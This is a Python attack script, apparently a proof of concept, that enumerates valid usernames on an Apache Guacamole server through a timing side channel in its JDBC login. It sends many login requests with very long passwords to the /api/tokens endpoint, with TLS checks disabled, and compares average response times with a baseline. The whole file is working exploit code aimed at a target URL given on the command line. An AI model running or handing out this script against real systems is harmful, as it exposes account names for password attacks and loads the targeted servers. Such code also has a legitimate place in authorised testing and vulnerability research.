# Python 3 requirements: requests, progressbar2, scipy
#
# Try to exploit a time based user enumeration in Guacamole JDBC driver

import requests
import statistics
import argparse
import math

from progressbar import progressbar
from scipy import stats


parser = argparse.ArgumentParser(
	description="Apache Guacamole JDBC driver time based user enumeration"
)
parser.add_argument("-t", "--target", type=str, help="The base Guacamole URL", required=True)
parser.add_argument("-u", "--user", type=str, help="The user you want to check for", required=True)
parser.add_argument("--checks", type=int, default=5, help="The number checks to perform for a user (Default: 5)", required=False)
parser.add_argument("--threshhold", type=float, default=0.003, help="The minimum time difference to consider as a valid user (Default: 0.003)", required=False)

args = parser.parse_args()
target_url = args.target
user_to_test = args.user
checks = args.checks
threshhold = args.threshhold

def get_elapsed_mean(user="slkdjf123!", iterations=100):
	url = f"{target_url}/api/tokens"
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
		"Content-Type": "application/x-www-form-urlencoded"
	}

	elapsed = []
	elapsed_normalized = []

	for x in progressbar(range(iterations)):
		data = {"username": user, "password": "TestPassword123!!"*50000}
		response = requests.post(url, headers=headers, data=data, verify=False)
		elapsed.append(response.elapsed.total_seconds())


	for id_zscore, zscore in enumerate(list(stats.zscore(elapsed))):
		if abs(zscore) < 1.8:
			elapsed_normalized.append(elapsed[id_zscore])

	return statistics.mean(elapsed_normalized)


print("Apache Guacamole time based user enumeration")
print("")

# Calculate baseline
print("Calculating baseline... ")
baseline = get_elapsed_mean()
print()

wins = 0
print(f"Trying to guess user existence ({checks} tests)... ")
for check_id, test_user in enumerate([user_to_test]*checks):
	print(f"[Check {check_id+1}/{checks}]")
	# Predict existence
	user_baseline = get_elapsed_mean(user=test_user, iterations=50)

	# Compare baselines
	diff = user_baseline - baseline
	if math.isclose(diff, 0, abs_tol=threshhold):
		diff = 0
	print(f"Diff --> {diff}")
	print()

	if(diff > 0):
		wins = wins + 1

if (wins/checks)*100 > 60:
	print("The user exists!")
else:
	print("Wrong user!")
